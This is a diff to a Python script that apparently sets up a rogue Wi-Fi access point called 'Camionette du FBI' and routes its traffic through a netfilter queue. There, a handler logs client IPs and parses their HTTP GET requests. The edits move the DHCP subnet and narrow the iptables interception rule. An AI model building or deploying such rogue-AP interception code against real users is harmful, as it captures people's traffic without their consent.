@@ -12,6 +12,8 @@ def process_packet(packet):
 	ip = pckt.sprintf("{IP:%IP.src%}")
 	data = pckt.sprintf("{Raw:%Raw.load%}")
 
+	print(ip)
+
 	if data[:4] == "'GET" and data.find("Referer") == -1:
 		arr = data.split("\\r\\n")
 		arr2 = arr[1].split(" ")
@@ -52,13 +54,13 @@ print("Creating config files...")
 f = open("/tmp/dnsmasq.conf", "w")
 f.write(f"\
 interface={sys.argv[2]}\n\
-dhcp-range=192.168.1.50,192.168.1.150,12h\n\
+dhcp-range=192.168.2.50,192.168.2.150,12h\n\
 dhcp-option=6,8.8.8.8\n\
-dhcp-option=3,192.168.1.1")
+dhcp-option=3,192.168.2.1")
 f.close()
 
 # Set AP ip address
-os.system(f"ip addr add 192.168.1.1/24 dev {sys.argv[2]}")
+os.system(f"ip addr add 192.168.2.1/24 dev {sys.argv[2]}")
 
 f = open("/tmp/hostapd.conf", "w")
 f.write(f"\
@@ -83,8 +85,8 @@ print("Done ! You should see 'Camionette du FBI' wifi")
 print("Ctrl-C when you're done...")
 
 #os.system(f"iptables -i {sys.argv[2]} -j NFQUEUE --queue-num 0")
-os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
-
+os.system(f"iptables -I OUTPUT -o {sys.argv[2]} -j NFQUEUE --queue-num 0")
+#os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")
 
 queue = NetfilterQueue()
 queue.bind(0, process_packet)
